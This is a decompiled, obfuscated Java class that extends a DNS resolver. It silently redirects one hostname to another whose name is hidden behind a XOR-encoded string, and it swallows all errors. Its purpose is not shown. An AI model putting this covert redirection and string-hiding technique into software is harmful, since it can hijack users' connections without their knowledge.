/*
 * Decompiled with CFR 0.152.
 */
import com.c;
import java.lang.reflect.InvocationTargetException;
import java.net.InetAddress;
import org.apache.hc.client5.http.SystemDefaultDnsResolver;

/*
 * Renamed from yV
 */
class yv_1
extends SystemDefaultDnsResolver {
    final tl_1 S;
    private static final String a;

    yv_1(tl_1 tl_12) {
        this.S = tl_12;
    }

    @Override
    public InetAddress[] resolve(String string) {
        InetAddress[] inetAddressArray = null;
        try {
            String string2;
            String string3;
            try {
                string3 = (String)lk_0.P(5);
            }
            catch (InvocationTargetException invocationTargetException) {
                throw invocationTargetException.getTargetException();
            }
            try {
                string2 = (String)lk_0.B(a);
            }
            catch (InvocationTargetException invocationTargetException) {
                throw invocationTargetException.getTargetException();
            }
            String string4 = string3 + string2;
            inetAddressArray = string.equals((String)this.S.e) ? super.resolve(string4) : super.resolve(string);
        }
        catch (Exception exception) {
            // empty catch block
        }
        return inetAddressArray;
    }

    /*
     * Handled impossible loop by duplicating code
     * Enabled aggressive block sorting
     */
    static {
        char[] cArray;
        block12: {
            int n10;
            char[] cArray2;
            int n11;
            int n12;
            block11: {
                char[] cArray3 = "\u0002I`\u007fI\u0015\u0012-hWdC\u00180#|A-B85\u0018Wj\u0006?\u000b\b2lqfK\u000e5\u001ef[$Hx\u001c\u0014[%'Z\u0015".toCharArray();
                int n13 = cArray3.length;
                n12 = 0;
                n11 = 44;
                cArray2 = cArray3;
                n10 = n13;
                if (n13 <= 1) break block11;
                cArray = cArray2;
                n10 = n10;
                if (n10 <= n12) break block12;
            }
            do {
                int n14 = n11;
                cArray2 = cArray2;
                char[] cArray4 = cArray2;
                int n15 = n11;
                int n16 = n12;
                while (true) {
                    int n17;
                    switch (n12 % 7) {
                        case 0: {
                            n17 = 119;
                            break;
                        }
                        case 1: {
                            n17 = 33;
                            break;
                        }
                        case 2: {
                            n17 = 63;
                            break;
                        }
                        case 3: {
                            n17 = 120;
                            break;
                        }
                        case 4: {
                            n17 = 35;
                            break;
                        }
                        case 5: {
                            n17 = 108;
                            break;
                        }
                        default: {
                            n17 = 74;
                        }
                    }
                    cArray4[n16] = (char)(cArray4[n16] ^ (n15 ^ n17));
                    ++n12;
                    n11 = n14;
                    if (n14 != 0) break;
                    n14 = n11;
                    cArray2 = cArray2;
                    n16 = n11;
                    cArray4 = cArray2;
                    n15 = n11;
                }
                cArray = cArray2;
                n10 = n10;
            } while (n10 > n12);
        }
        a = new String(cArray).intern();
    }
}

